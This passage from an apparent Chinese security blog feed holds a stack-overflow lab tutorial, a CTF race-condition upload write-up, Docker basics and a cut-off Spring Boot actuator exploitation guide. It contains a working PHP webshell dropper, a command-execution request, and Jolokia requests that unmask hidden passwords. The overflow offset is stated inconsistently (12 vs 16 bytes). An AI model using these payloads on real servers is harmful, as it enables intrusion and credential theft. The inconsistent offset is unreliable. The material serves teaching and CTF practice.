栈内存布局</h3><p>当程序调用一个函数时（如<code>main</code>调用<code>returnInput</code>），计算机会在内存的”栈”区域创建一个”栈帧”。这个栈帧包含：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">|<span class="hljs-string">-------------------</span>|<br>|<span class="hljs-string">   参数（如果有）   </span>|<span class="hljs-string">  ← 高地址</span><br><span class="hljs-string"></span>|<span class="hljs-string">-------------------</span>|<br>|<span class="hljs-string">   返回地址        </span>|<span class="hljs-string">  ← 指向调用函数后应该返回的位置</span><br><span class="hljs-string"></span>|<span class="hljs-string">-------------------</span>|<br>|<span class="hljs-string">   旧的ebp         </span>|<span class="hljs-string">  ← 前一个栈帧的基址指针</span><br><span class="hljs-string"></span>|<span class="hljs-string">-------------------</span>|<br>|<span class="hljs-string">   局部变量        </span>|<span class="hljs-string">  ← 低地址（c[4], i, sum等）</span><br><span class="hljs-string"></span>|<span class="hljs-string">-------------------</span>|<br></code></pre></td></tr></table></figure><p><strong>关键点</strong>：栈是从高地址向低地址生长的，但数组是从低地址向高地址填充的。</p><h3 id="2-为什么要找”偏移量”？"><a href="#2-为什么要找”偏移量”？" class="headerlink" title="2. 为什么要找”偏移量”？"></a>2. 为什么要找”偏移量”？</h3><p>代码中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> c[<span class="hljs-number">4</span>];  <span class="hljs-comment">// 4字节的数组</span><br><span class="hljs-type">int</span> i;      <span class="hljs-comment">// 4字节的整数  </span><br><span class="hljs-type">int</span> sum;    <span class="hljs-comment">// 4字节的整数</span><br></code></pre></td></tr></table></figure><p>假设内存布局是这样的：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">地址:     内容</span><br><span class="hljs-section">0x1000:  c[0]   ← 数组开始</span><br><span class="hljs-section">0x1001:  c[1]</span><br><span class="hljs-section">0x1002:  c[2]</span><br><span class="hljs-section">0x1003:  c[3]   ← 数组结束</span><br><span class="hljs-section">0x1004:  i      ← 整数i</span><br><span class="hljs-section">0x1008:  sum    ← 整数sum</span><br><span class="hljs-section">0x100C:  旧的ebp ← 保存的基址指针</span><br><span class="hljs-section">0x1010:  返回地址 ← 目标！</span><br></code></pre></td></tr></table></figure><p><strong>偏移量</strong>就是从数组开始位置(<code>c[0]</code>)到返回地址的<strong>距离</strong>。在这个例子中，偏移量是12字节(0x1010 - 0x1000 &#x3D; 0x10 &#x3D; 16，但实际计算需要考虑对齐等因素)。</p><h3 id="3-为什么用四个赋值语句？"><a href="#3-为什么用四个赋值语句？" class="headerlink" title="3. 为什么用四个赋值语句？"></a>3. 为什么用四个赋值语句？</h3><p>因为返回地址是32位(4字节)的，而<code>char</code>是8位(1字节)的。我们需要用4个<code>char</code>来覆盖一个返回地址。</p><h3 id="4-小端序"><a href="#4-小端序" class="headerlink" title="4. 小端序"></a>4. 小端序</h3><p>假设<code>hacked()</code>函数的地址是<code>0x08048456</code>，在小端系统中，内存中存储为：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">低地址 → 高地址<br><span class="hljs-number">56 84 04 08</span><br></code></pre></td></tr></table></figure><p>所以我们需要按这个顺序写入内存。</p><h2 id="实验步骤-1"><a href="#实验步骤-1" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="步骤1：查看源代码"><a href="#步骤1：查看源代码" class="headerlink" title="步骤1：查看源代码"></a>步骤1：查看源代码</h3><ul><li>理解程序结构和漏洞位置。这里的漏洞是数组越界。</li></ul><h3 id="步骤2：编译带调试信息"><a href="#步骤2：编译带调试信息" class="headerlink" title="步骤2：编译带调试信息"></a>步骤2：编译带调试信息</h3><ul><li><code>-g</code>选项让编译器保留变量名、行号等信息，这样GDB可以显示更有用的信息。</li></ul><h3 id="步骤3-4：使用GDB分析"><a href="#步骤3-4：使用GDB分析" class="headerlink" title="步骤3-4：使用GDB分析"></a>步骤3-4：使用GDB分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gdb"># 查看堆栈内存布局<br>x/24w $esp<br><br># 单步执行观察变化  <br>step<br></code></pre></td></tr></table></figure><ul><li>为了实际查看内存中的布局，找到返回地址的确切位置，计算准确的偏移量。</li></ul><h3 id="步骤5：小端序"><a href="#步骤5：小端序" class="headerlink" title="步骤5：小端序"></a>步骤5：小端序</h3><ul><li>确保我们以正确的顺序写入地址字节。</li></ul><h3 id="步骤6-8：实施攻击"><a href="#步骤6-8：实施攻击" class="headerlink" title="步骤6-8：实施攻击"></a>步骤6-8：实施攻击</h3><ul><li>通过覆盖返回地址，我们”欺骗”CPU，让它认为函数应该返回到<code>hacked()</code>而不是<code>main()</code>。</li></ul><h2 id="实际操作：找到真正的偏移量"><a href="#实际操作：找到真正的偏移量" class="headerlink" title="实际操作：找到真正的偏移量"></a>实际操作：找到真正的偏移量</h2><p>用GDB来实际找出偏移量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gdb">gdb stack<br>break returnInput  # 在函数开始处断点<br>run<br><br># 查看变量地址<br>print &amp;c<br>print &amp;i  <br>print &amp;sum<br><br># 查看返回地址位置<br>info frame<br></code></pre></td></tr></table></figure><p>假设：</p><ul><li><code>c[0]</code>在地址<code>0xbffffab0</code></li><li>返回地址在<code>0xbffffac0</code></li></ul><p>那么偏移量 &#x3D; <code>0xbffffac0 - 0xbffffab0</code> &#x3D; 16字节</p><p>需要覆盖<code>c[16]</code>到<code>c[19]</code>来修改返回地址。</p><h2 id="最终的攻击代码原理"><a href="#最终的攻击代码原理" class="headerlink" title="最终的攻击代码原理"></a>最终的攻击代码原理</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">returnInput</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> c[<span class="hljs-number">4</span>];<br>    <span class="hljs-comment">// 获取hacked函数地址</span><br>    <span class="hljs-type">long</span> hackedAddr = (<span class="hljs-type">long</span>)hacked;<br>    <br>    <span class="hljs-comment">// 覆盖返回地址（假设偏移量是12）</span><br>    c[<span class="hljs-number">12</span>] = hackedAddr &amp; <span class="hljs-number">0xFF</span>;           <span class="hljs-comment">// 最低字节 (0x56)</span><br>    c[<span class="hljs-number">13</span>] = (hackedAddr &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>;    <span class="hljs-comment">// 次低字节 (0x84) </span><br>    c[<span class="hljs-number">14</span>] = (hackedAddr &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>;   <span class="hljs-comment">// 次高字节 (0x04)</span><br>    c[<span class="hljs-number">15</span>] = (hackedAddr &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>;   <span class="hljs-comment">// 最高字节 (0x08)</span><br>&#125;<br></code></pre></td></tr></table></figure><p>偏移量是从数组开始到返回地址的”距离”，需要这个距离来精确地覆盖返回地址，从而改变程序的行为。这就是缓冲区溢出攻击的核心原理。</p>]]></content>
    
    
    <categories>
      
      <category>其他</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF条件竞争漏洞</title>
    <link href="/2025/02/11/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/"/>
    <url>/2025/02/11/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/</url>
    
    <content type="html"><![CDATA[<p><strong>条件竞争</strong>指的是程序的<strong>执行结果依赖于不受控制的事件发生的顺序或时机</strong>。当多个线程或进程在没有适当同步机制的情况下，同时访问和操作共享资源（如文件、变量、数据库记录）时，就可能出现非预期的、错误的执行结果。</p><h2 id="核心原理："><a href="#核心原理：" class="headerlink" title="核心原理："></a>核心原理：</h2><ol><li><p><strong>共享资源：</strong> 存在一个多个请求&#x2F;线程&#x2F;进程都能访问的资源（例如：一个<strong>临时文件</strong>、一个状态标志、一个数据库字段、一个计数器）。</p></li><li><p><strong>非原子操作：</strong> 对共享资源的操作不是“原子性”的。这意味着完成操作需要多个步骤，在这些步骤之间可以被中断，让其他请求介入。</p></li><li><p><strong>并发访问：</strong> 攻击者能够以极高的并发度（同时或极短时间内）发送多个请求，试图让这些请求的执行流在操作共享资源的关键步骤上相互交织。</p></li><li><p><strong>非预期交织：</strong> 由于请求的执行顺序和时机不确定，攻击者精心构造的并发请求可能导致操作步骤以开发者未预料到的顺序执行。</p></li><li><p><strong>利用结果：</strong> 这种非预期的执行顺序导致程序进入一个非预期的、通常是有利于攻击者的状态（例如：绕过检查、创建非预期文件、提升权限）。</p></li></ol><hr><h2 id="文件上传-解析-执行-经典案例"><a href="#文件上传-解析-执行-经典案例" class="headerlink" title="文件上传 + 解析&#x2F;执行 (经典案例):"></a>文件上传 + 解析&#x2F;执行 (经典案例):</h2><ul><li><strong>场景：</strong> 服务器允许用户上传文件。上传后，服务器会对文件进行一些检查（如检查文件类型、内容），如果检查通过，会将文件移动到一个有执行权限的目录（如 <code>uploads/</code>）；如果检查不通过，会删除该临时文件。</li><li><strong>漏洞：</strong> 检查(<code>check</code>)和移动(<code>move</code>)是两个独立的操作，不是原子的。在<code>check</code>完成之后、<code>move</code>执行之前，存在一个非常短暂的时间窗口。</li><li><strong>攻击：</strong><ol><li>攻击者不断快速上传一个包含恶意代码（如 Webshell）的文件 <code>shell.php</code>。</li><li>服务器收到上传后，将文件保存为一个<strong>临时文件名</strong>（如 <code>/tmp/tmp_upload_12345</code>）。</li><li>服务器开始对这个临时文件进行检查。</li><li>在检查<strong>完成之后</strong>（假设检查逻辑有漏洞被绕过，或者攻击者利用速度制造混乱），但在服务器将其<strong>移动到最终目录之前</strong>（例如 <code>uploads/shell.php</code>），攻击者以极高的并发度疯狂访问这个<strong>临时文件</strong>对应的最终预期URL（如 <code>http://target/uploads/shell.php</code>）。</li><li>由于访问请求极快且大量，<strong>有可能</strong>在某个时刻，服务器刚刚完成检查认为文件合法，<strong>还没来得及移动文件</strong>，就有一个访问请求到达了Web服务器（如 Apache&#x2F;Nginx）。</li><li>Web服务器尝试去 <code>uploads/</code> 目录下寻找 <code>shell.php</code>，但此时文件还在 <code>/tmp/tmp_upload_12345</code>，所以没找到，返回404。</li><li><strong>但是！</strong> 如果攻击者的访问请求在服务器将临时文件移动到 <code>uploads/shell.php</code> <strong>之后</strong>才被Web服务器处理，那么Web服务器就能找到并执行这个 <code>shell.php</code> 文件，攻击者的恶意代码就执行成功了！</li></ol></li><li><strong>关键：</strong> 攻击者通过海量的并发访问，赌那个“移动文件刚刚完成，访问请求就到达”的时机。虽然单个请求命中的概率很低，但海量请求下总有一次会成功。成功执行后，攻击者就获得了Webshell。</li></ul><hr><h2 id="购买-兑换逻辑（有限资源或支付校验）："><a href="#购买-兑换逻辑（有限资源或支付校验）：" class="headerlink" title="购买&#x2F;兑换逻辑（有限资源或支付校验）："></a>购买&#x2F;兑换逻辑（有限资源或支付校验）：</h2><ul><li><strong>场景：</strong> 用户用积分购买商品或兑换优惠券。流程是：1) 检查用户积分是否足够； 2) 如果足够，则扣除积分； 3) 发放商品&#x2F;优惠券。</li><li><strong>漏洞：</strong> “检查积分”和“扣除积分”不是原子操作。</li><li><strong>攻击：</strong><ol><li>攻击者账户只有够买1件商品的积分。</li><li>攻击者同时发送大量购买请求（比如100个）。</li><li>服务器在处理第一个请求时，检查积分（足够） -&gt; 扣除积分（变为0） -&gt; 发放商品。</li><li>但在处理后续的99个请求时，因为它们几乎是<strong>同时</strong>到达，服务器在<strong>扣除积分之前</strong>检查积分，看到的都是<strong>原始的、足够的积分</strong>（因为第一个请求的扣除操作可能还没写入数据库，或者读到了旧缓存）。于是服务器认为积分足够，继续执行扣除和发放操作。</li><li>结果：攻击者用仅够买1件商品的积分，成功购买了100件商品。服务器积分被扣成负数，或者错误地发放了大量优惠券&#x2F;商品。</li></ol></li></ul><hr><h2 id="攻击代码（假设文件名为-shell-php）："><a href="#攻击代码（假设文件名为-shell-php）：" class="headerlink" title="攻击代码（假设文件名为 shell.php）："></a>攻击代码（假设文件名为 shell.php）：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;my.php&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>), <span class="hljs-string">&#x27;&lt;?php eval($_POST[my]);?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>代码解析</strong>：</p><ol><li><strong><code>fopen(&quot;my.php&quot;, &quot;w&quot;)</code></strong>  <ul><li>以<strong>写入模式</strong>打开当前目录下的 <code>my.php</code> 文件（不存在则创建）。</li></ul></li><li><strong><code>fputs(..., &#39;&lt;?php eval($_POST[1]);?&gt;&#39;)</code></strong>  <ul><li>向 <code>my.php</code> 写入内容：<code>&lt;?php eval($_POST[my]);?&gt;</code>  </li><li><code>eval($_POST[my])</code> 表示执行通过POST参数 <code>my</code> 传递的任意代码（例如 <code>my=system(&quot;ls&quot;)</code> 可执行系统命令）。</li></ul></li><li><strong>整体作用</strong><br><strong>当此文件被PHP解析执行时，会在当前目录生成一个恶意Webshell文件 <code>my.php</code></strong>，攻击者通过访问 <code>my.php</code> 即可控制服务器。</li></ol><hr><p><strong>shell.php执行后新建my.php文件并写入一句话木马，作用是当上传的shell.php被删后，后端还存有my.php中的后门，方便连接。</strong></p><p>接下来抓取上传shell.php的请求包，发送到<strong>Intruder</strong>爆破模块</p><p><img src="/images/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89.png"></p><p>除此之外最好设置多线程重放，增加条件竞争成功的可能性。</p><p>不断访问上传的<code>shell.php</code>文件，一旦有<code>200</code>状态码，说明条件竞争成功。监控脚本启动后，开始进行无限重放</p><h2 id="验证攻击"><a href="#验证攻击" class="headerlink" title="验证攻击"></a>验证攻击</h2><p>访问 <code>http://ctf.com/uploads/my.php</code>，用HackBar发送POST请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/uploads/my.php</span> <span class="hljs-meta">HTTP/1.1</span><br>...<br>my=system(&quot;ls -al /&quot;);<br></code></pre></td></tr></table></figure><p>若返回服务器目录列表，则攻击成功。</p><hr><h3 id="防御方案（CTF出题方向）"><a href="#防御方案（CTF出题方向）" class="headerlink" title="防御方案（CTF出题方向）"></a>防御方案（CTF出题方向）</h3><ol><li><p><strong>禁用临时文件执行</strong>  </p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> <span class="hljs-regexp">~ /tmp/</span> &#123;<br>   <span class="hljs-attribute">deny</span> all; <span class="hljs-comment"># 禁止访问/tmp目录</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>原子性移动操作</strong><br>使用 <code>rename()</code> 而非分步操作（Linux下移动是原子的）。</p></li><li><p><strong>内容二次渲染</strong><br>对图片进行压缩&#x2F;缩放，破坏嵌入的PHP代码。</p></li><li><p><strong>临时目录隔离</strong><br>将临时文件生成到不可访问的私有目录（如 <code>/var/upload_tmp/</code>）。</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>web漏洞</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>通达</title>
    <link href="/2025/02/05/%E9%80%9A%E8%BE%BEOA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/02/05/%E9%80%9A%E8%BE%BEOA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p><img src="/../images/image-20250721120415140.png" alt="image-20250721120415140"></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>docker</title>
    <link href="/2025/01/22/docker/"/>
    <url>/2025/01/22/docker/</url>
    
    <content type="html"><![CDATA[<h3 id="Docker-容器基本操作"><a href="#Docker-容器基本操作" class="headerlink" title="Docker 容器基本操作"></a>Docker 容器基本操作</h3><p>Docker 是一种容器化技术，可将应用及其依赖打包为独立容器。以下是基本操作指南：</p><p><strong>1. 容器生命周期管理</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 运行新容器（-d后台运行，-p端口映射，--name命名）</span><br>docker run -d -p 80:80 --name web nginx<br><br><span class="hljs-comment"># 查看运行中容器</span><br>docker ps<br><br><span class="hljs-comment"># 查看所有容器（包括已停止的）</span><br>docker ps -a<br><br><span class="hljs-comment"># 停止/启动/重启容器</span><br>docker stop web<br>docker start web<br>docker restart web<br><br><span class="hljs-comment"># 删除容器（需先停止）</span><br>docker <span class="hljs-built_in">rm</span> web<br><br><span class="hljs-comment"># 强制删除运行中的容器</span><br>docker <span class="hljs-built_in">rm</span> -f web<br><br></code></pre></td></tr></table></figure><p><strong>2. 容器内操作</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 进入容器交互式终端</span><br>docker <span class="hljs-built_in">exec</span> -it web bash<br><br><span class="hljs-comment"># 查看容器日志</span><br>docker logs web<br><br><span class="hljs-comment"># 查看容器资源使用情况</span><br>docker stats web<br><br></code></pre></td></tr></table></figure><h3 id="Docker-镜像创建"><a href="#Docker-镜像创建" class="headerlink" title="Docker 镜像创建"></a>Docker 镜像创建</h3><p>镜像是容器的模板，可通过 Dockerfile 构建：</p><p><strong>1. Dockerfile 示例</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment"># 基础镜像</span><br><span class="hljs-keyword">FROM</span> python:<span class="hljs-number">3.9</span><br><br><span class="hljs-comment"># 设置工作目录</span><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /app</span><br><br><span class="hljs-comment"># 复制依赖文件并安装</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> requirements.txt .</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> pip install -r requirements.txt</span><br><br><span class="hljs-comment"># 复制应用代码</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> . .</span><br><br><span class="hljs-comment"># 暴露端口</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">5000</span><br><br><span class="hljs-comment"># 启动命令</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;python&quot;</span>, <span class="hljs-string">&quot;app.py&quot;</span>]</span><br><br></code></pre></td></tr></table></figure><p><strong>2. 构建与推送镜像</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 构建镜像（-t标签，.表示当前目录的Dockerfile）</span><br>docker build -t my-app:1.0 .<br><br><span class="hljs-comment"># 查看本地镜像</span><br>docker images<br><br><span class="hljs-comment"># 登录Docker Hub</span><br>docker login<br><br><span class="hljs-comment"># 标记镜像以推送至仓库</span><br>docker tag my-app:1.0 username/my-app:1.0<br><br><span class="hljs-comment"># 推送镜像</span><br>docker push usernae/my-app:1.0<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>swagger</title>
    <link href="/2025/01/20/Swagger%E6%8E%A5%E5%8F%A3%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    <url>/2025/01/20/Swagger%E6%8E%A5%E5%8F%A3%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</url>
    
    <content type="html"><![CDATA[<h1 id="SpringBoot漏洞利用总结"><a href="#SpringBoot漏洞利用总结" class="headerlink" title="SpringBoot漏洞利用总结"></a>SpringBoot漏洞利用总结</h1><h2 id="比较重要的接口"><a href="#比较重要的接口" class="headerlink" title="比较重要的接口"></a>比较重要的接口</h2><ul><li><p><code>/env</code>、<code>/actuator/env</code></p><p>GET 请求 <code>/env</code> 会直接泄露环境变量、内网地址、配置中的用户名等信息；当程序员的属性名命名不规范，例如 password 写成 psasword、pwd 时，会泄露密码明文；</p><p>同时有一定概率可以通过 POST 请求 <code>/env</code> 接口设置一些属性，间接触发相关 RCE 漏洞；同时有概率获得星号遮掩的密码、密钥等重要隐私信息的明文。</p></li><li><p><code>/refresh</code>、<code>/actuator/refresh</code></p><p>POST 请求 <code>/env</code> 接口设置属性后，可同时配合 POST 请求 <code>/refresh</code> 接口刷新属性变量来触发相关 RCE 漏洞。</p></li><li><p><code>/restart</code>、<code>/actuator/restart</code></p><p>暴露出此接口的情况较少；可以配合 POST请求 <code>/env</code> 接口设置属性后，再 POST 请求 <code>/restart</code> 接口重启应用来触发相关 RCE 漏洞。</p></li><li><p><code>/jolokia</code>、<code>/actuator/jolokia</code></p><p>可以通过 <code>/jolokia/list</code> 接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等。</p></li><li><p><code>/trace</code>、<code>/actuator/httptrace</code></p><p>一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情；以及有效用户或管理员的 cookie、jwt token 等信息。</p></li></ul><h3 id="获取被星号脱敏的密码的明文-方法一"><a href="#获取被星号脱敏的密码的明文-方法一" class="headerlink" title="获取被星号脱敏的密码的明文 (方法一)"></a>获取被星号脱敏的密码的明文 (方法一)</h3><blockquote><p>访问 &#x2F;env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p></blockquote><p><a href="https://img2024.cnblogs.com/blog/3310985/202501/3310985-20250121223106774-1246435939.png"><img src="https://img2024.cnblogs.com/blog/3310985/202501/3310985-20250121223106774-1246435939.png" alt="image"></a></p><h4 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</li><li>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）</li></ul><p><strong>Jolokia代理：</strong><br>Jolokia是一个开源的JMX到HTTP&#x2F;JSON的桥梁，它允许通过HTTP协议访问Java管理扩展（JMX）MBean。<br>攻击者可以通过Jolokia代理访问目标系统中的MBean，并调用其方法。</p><h4 id="利用方法："><a href="#利用方法：" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：-找到想要获取的属性名"><a href="#步骤一：-找到想要获取的属性名" class="headerlink" title="步骤一： 找到想要获取的属性名"></a>步骤一： 找到想要获取的属性名</h5><p>GET 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p><h5 id="步骤二：-jolokia-调用相关-Mbean-获取明文"><a href="#步骤二：-jolokia-调用相关-Mbean-获取明文" class="headerlink" title="步骤二： jolokia 调用相关 Mbean 获取明文"></a>步骤二： jolokia 调用相关 Mbean 获取明文</h5><p>将下面示例中的 <code>security.user.password</code> 替换为实际要获取的属性名，直接发包；明文值结果包含在 response 数据包中的 <code>value</code> 键中。</p><ul><li>调用 <code>org.springframework.boot</code> Mbean</li></ul><blockquote><p>实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法</p></blockquote><p>spring 1.x</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nix">POST <span class="hljs-symbol">/jolokia</span><br><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json</span><br><br>&#123;<span class="hljs-string">&quot;mbean&quot;</span>: <span class="hljs-string">&quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;</span>,<span class="hljs-string">&quot;operation&quot;</span>: <span class="hljs-string">&quot;getProperty&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;EXEC&quot;</span>, <span class="hljs-string">&quot;arguments&quot;</span>: [<span class="hljs-string">&quot;security.user.password&quot;</span>]&#125;<br></code></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nix">POST <span class="hljs-symbol">/actuator/jolokia</span><br><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json</span><br><br>&#123;<span class="hljs-string">&quot;mbean&quot;</span>: <span class="hljs-string">&quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;</span>,<span class="hljs-string">&quot;operation&quot;</span>: <span class="hljs-string">&quot;getProperty&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;EXEC&quot;</span>, <span class="hljs-string">&quot;arguments&quot;</span>: [<span class="hljs-string">&quot;security.user.password&quot;</span>]&#125;<br></code></pre></td></tr></table></figure><ul><li>调用 <code>org.springframework.cloud.context.environment</code> Mbean</li></ul><blockquote><p>实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法</p></blockquote><p>spring 1.x</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nix">POST <span class="hljs-symbol">/jolokia</span><br><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json</span><br><br>&#123;<span class="hljs-string">&quot;mbean&quot;</span>: <span class="hljs-string">&quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;</span>,<span class="hljs-string">&quot;operation&quot;</span>: <span class="hljs-string">&quot;getProperty&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;EXEC&quot;</span>, <span class="hljs-string">&quot;arguments&quot;</span>: [<span class="hljs-string">&quot;security.user.password&quot;</span>]&#125;<br></code></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nix">POST <span class="hljs-symbol">/actuator/jolokia</span><br><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json</span><br><br>&#123;<span class="hljs-string">&quot;mbean&quot;</span>: <span class="hljs-string">&quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;</span>,<span class="hljs-string">&quot;operation&quot;</span>: <span class="hljs-string">&quot;getProperty&quot;</span>, <span 